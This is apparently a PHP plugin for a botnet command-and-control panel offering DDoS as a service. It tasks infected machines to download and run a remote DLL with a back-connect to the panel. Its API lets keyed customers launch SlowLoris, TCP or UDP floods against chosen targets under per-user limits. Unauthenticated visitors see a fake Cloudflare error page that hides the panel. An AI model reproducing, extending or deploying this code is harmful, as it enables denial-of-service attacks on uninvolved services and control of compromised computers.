<?php
$pluginName = "ddos";

$GLOBALS["foundPlugins"][$pluginName]["plugindir"] = __DIR__;

require __DIR__."/Controller/ddosController.class.php";
require __DIR__."/Controller/ddosHandlerController.php";





register_navigation_tab("ddos",get_plugin_include_dir("about")."assets/nav/about.svg");
$GLOBALS["task_configuration"]["ddos"] = array(
    "name" => "DDos Invite",
    "command" => "runplugin",
    "value" => "http://".$_SERVER["HTTP_HOST"]."/versions/".$GLOBALS["loadedVersion"]."/plugins/ddos/dll/ddoshandle.dll;BackConnect;".$_SERVER["HTTP_HOST"]."/ddoscontroll",
);

$router->all('/ddos', 'ddosController@ddoshub');
$router->all('/ddosinfo', 'ddosController@ddosinfo');


$router->all('/ddoscontroll', 'ddosHandlerController@ddoscontroll');


$ddosMethods = array(
    "slow" => "SlowLoris",
    "tcp" => "TCP",
    "udp" => "UDP",
);


$router->all('/ddosapi/v1', function() {
    $GLOBALS["template"][0] = "FakeErrors";
    $GLOBALS["template"][1] = "cloudflare_offlinehost";

    if(!empty($_REQUEST["apikey"])){
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_apis WHERE apikey = :apikey");
        $result = $statement->execute(array('apikey' => $_REQUEST["apikey"]));
        $user = $statement->fetch();
        if($user !== false){
            //User Exists
            if(empty($_REQUEST["handle"])){
                die("Wrong Usage");
            }

            if($_REQUEST["handle"] == "attack"){
                if(empty($_REQUEST["method"] )){
                    die("Set a method");
                }
                if(empty($_REQUEST["maxtime"])){
                    die("Set a time");
                }
                if( $_REQUEST["maxtime"] > $user["max_time_per_task"]){
                    die("Max time Limit");
                }
                if(empty($_REQUEST["targetip"])){
                    die("Set a target");
                }
                if(empty($_REQUEST["port"] )){
                    die("Set a target Port");
                }
                $_REQUEST["port"] = intval($_REQUEST["port"]);
                if(!is_int($_REQUEST["port"])){
                    die("Port need to be a Int");
                }

                if(empty($GLOBALS["ddosMethods"][$_REQUEST["method"]])){
                    die("Unknow method");
                }
                if ($_REQUEST["method"] == "slow") {
                    if (filter_var($_REQUEST["targetip"], FILTER_VALIDATE_URL) === FALSE) {
                        die('Not a valid URL');
                    }
                }
                if ($_REQUEST["method"] == "tcp" || $_REQUEST["method"] == "udp") {
                    if (filter_var($_REQUEST["targetip"], FILTER_VALIDATE_IP) === FALSE) {
                        die('Not a valid IP');
                    }
                }


                $statement = $GLOBALS["pdo"]->prepare("SELECT count(*) as count FROM ddos_tasks WHERE origin_from = ? AND created_by = ? AND status = ? ");
                $statement->execute(array("api",$_REQUEST["apikey"],"active"));
                $count = $statement->fetch();
                if($count["count"] >= intval($user["max_tasks"])){
                    die('Max Task Limit');
                }

                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status,created_by,origin_from,max_executions) VALUES (?, ?, ?, ?, ?, ?, ?,?)");
                $bool = $statement->execute(array($_REQUEST["method"], $_REQUEST["targetip"], $_REQUEST["maxtime"], $_REQUEST["port"], "none",$_REQUEST["apikey"],"api",$user["max_bots_per_task"]));
                if($bool){
                    echo json_encode(array("taskid"=>$GLOBALS["pdo"]->lastInsertId()),true);
                    die();
                }else{
                    die("Unknown error");
                }
            }else if($_REQUEST["handle"] == "status"){
                if(empty($_REQUEST["id"])){
                    die("Task id needed");
                }
                if(!is_integer(intval($_REQUEST["id"]))){
                    die("Task id needs to be a int");
                }
                $statement = $GLOBALS["pdo"]->prepare("SELECT SUM(if(ddos_avalible.lastseen > ?, 1, 0)) as workingon,ddos_tasks.* FROM ddos_tasks 
                                               LEFT JOIN ddos_avalible on ddos_tasks.id = ddos_avalible.ddos_taskid WHERE ddos_tasks.id = ?");
                $statement->execute(array((time() - 5),$_REQUEST["id"]));
                $tasks = array();
                $task = $statement->fetch(PDO::FETCH_ASSOC);

                echo json_encode($task,true);
                die();
            }else if($_REQUEST["handle"] == "startstop"){

                if(empty($_REQUEST["id"])){
                    die("Task id needed");
                }

                if(!is_integer(intval($_REQUEST["id"]))){
                    die("Task id needs to be a int");
                }

                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE id = ?");
                $statement->execute(array($_REQUEST["id"]));
                $details = $statement->fetch();

                if($details["status"] != "active"){
                    $statement = $GLOBALS["pdo"]->prepare("SELECT count(*) as count FROM ddos_tasks WHERE origin_from = ? AND created_by = ? AND status = ? ");
                    $statement->execute(array("api",$_REQUEST["apikey"],"active"));
                    $count = $statement->fetch();
                    if($count["count"] >= intval($user["max_tasks"])){
                        die('Max Task Limit');
                    }
                }

                $status = 'active';
                if ($details["status"] == "active") {
                    $status = 'none';
                }
                $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET status = ? WHERE id = ?");
                $statement->execute(array($status, $_REQUEST["id"]));
                echo json_encode(array("status"=>$status),true);
                die();
            }else if($_REQUEST["handle"] == "apiinfo"){
                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ? AND active = 'none'");
                $statement->execute(array(time() - 5));
                $bots = array();
                while ($row = $statement->fetch()) {
                    $bots[] = $row;
                }
                $count = count($bots);
                echo json_encode(array("available"=>$count),true);
                die();
            }

            die("Found");
        }
    }
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $ray_id = '';
    for ($i = 0; $i < 16; $i++) {
        $ray_id .= $characters[rand(0, $charactersLength - 1)];
    }
    $GLOBALS["tpl"]->assign("ray_id",$ray_id);
});;